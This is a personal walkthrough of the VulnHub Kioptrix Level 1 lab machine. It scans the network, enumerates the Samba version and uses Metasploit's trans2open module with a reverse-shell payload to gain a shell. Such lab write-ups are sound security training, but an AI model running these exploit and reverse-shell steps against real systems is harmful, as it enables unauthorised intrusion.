@@ -1,0 +1,100 @@
+https://www.vulnhub.com/entry/kioptrix-level-1-1,22/
+
+
+apparently this one is easy.
+
+first, find the ip with arp-scan:
+
+# arp-scan -l
+Interface: eth0, type: EN10MB, MAC: 00:0c:29:d5:b2:94, IPv4: 192.168.72.129
+Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
+192.168.72.1    00:50:56:c0:00:08       VMware, Inc.
+192.168.72.2    00:50:56:f9:a9:b2       VMware, Inc.
+192.168.72.128  00:0c:29:8f:5b:43       VMware, Inc.
+192.168.72.254  00:50:56:f0:90:78       VMware, Inc.
+
+4 packets received by filter, 0 packets dropped by kernel
+Ending arp-scan 1.9.7: 256 hosts scanned in 1.972 seconds (129.82 hosts/sec). 4 responded
+
+for some reason I get 4 VMware machines, but after looking at the mac address i can tell 00:0c:29:8f:5b:43 is the one im looking for. Hence, the ip is 192.168.72.128.
+
+so we run an Nmap scan on the machine: nmap -T4 -p- -A 192.168.72.128
+
+something interesting: 139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
+
+let's also run nikto on the ip. one output is:
++ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. 
+
+*** you should save and analyse the entire nmap and nikto output
+
+check out Metasploit if it has any enumaeation module for smb, we wanna find out which version it's running:
+> search smb
+
+typically this is found in the auxilary module.... here's one that looks legit: auxiliary/scanner/smb/smb_version. so lets use that:
+> use auxiliary/scanner/smb/smb_version
+
+check out the options (> options) and see that it requires an RHOST, so we set it (> set rhost 192.168.72.128) and exploit (> exploit)
+
+taa-daa, it runs Samba 2.2.1a. 
+
+let's look for vulnerabilities surrounding Samba 2.2.1a. For instance in searchsploit (searchsplit Samba 2.2.1a), we keep coming across "trans2open"
+
+let's search for it in metasploit: 
+
+msf6 > search trans2open
+
+Matching Modules
+================
+
+   #  Name                              Disclosure Date  Rank   Check  Description
+   -  ----                              ---------------  ----   -----  -----------
+   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
+   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
+   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
+   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
+
+
+ok, we are gonna use the linux one (cause we learned from the scans that it runs linux)
+
+> use exploit/linux/samba/trans2open
+
+lets see in options (> options) that we have to define an rhost, so do that. 
+
+hit > exploit.
+
+and we see it keeps connecting and disconnecting.
+
+so let's CTRL + C it and see what payload its using.
+
+> options Payload options (linux/x86/meterpreter/reverse_tcp):
+
+lets use a non staged payload (sometimes that works)
+
+> set payload linux/x86/          DOUBLE TAB
+
+and we see: 
+
+msf6 exploit(linux/samba/trans2open) > set payload linux/x86/
+set payload linux/x86/adduser                         set payload linux/x86/shell/bind_ipv6_tcp
+set payload linux/x86/chmod                           set payload linux/x86/shell/bind_ipv6_tcp_uuid
+set payload linux/x86/exec                            set payload linux/x86/shell/bind_nonx_tcp
+set payload linux/x86/meterpreter/bind_ipv6_tcp       set payload linux/x86/shell/bind_tcp
+set payload linux/x86/meterpreter/bind_ipv6_tcp_uuid  set payload linux/x86/shell/bind_tcp_uuid
+set payload linux/x86/meterpreter/bind_nonx_tcp       set payload linux/x86/shell/reverse_ipv6_tcp
+set payload linux/x86/meterpreter/bind_tcp            set payload linux/x86/shell/reverse_nonx_tcp
+set payload linux/x86/meterpreter/bind_tcp_uuid       set payload linux/x86/shell/reverse_tcp
+set payload linux/x86/meterpreter/reverse_ipv6_tcp    set payload linux/x86/shell/reverse_tcp_uuid
+set payload linux/x86/meterpreter/reverse_nonx_tcp    set payload linux/x86/shell_bind_ipv6_tcp
+set payload linux/x86/meterpreter/reverse_tcp         set payload linux/x86/shell_bind_tcp
+set payload linux/x86/meterpreter/reverse_tcp_uuid    set payload linux/x86/shell_bind_tcp_random_port
+set payload linux/x86/metsvc_bind_tcp                 set payload linux/x86/shell_reverse_tcp
+set payload linux/x86/metsvc_reverse_tcp              set payload linux/x86/shell_reverse_tcp_ipv6
+set payload linux/x86/read_file 
+
+
+
+for a non staged payload, lets use "set payload linux/x86/shell_reverse_tcp"
+
+> exploit
+
+and now we have a reverse-shell in place. congrats. 
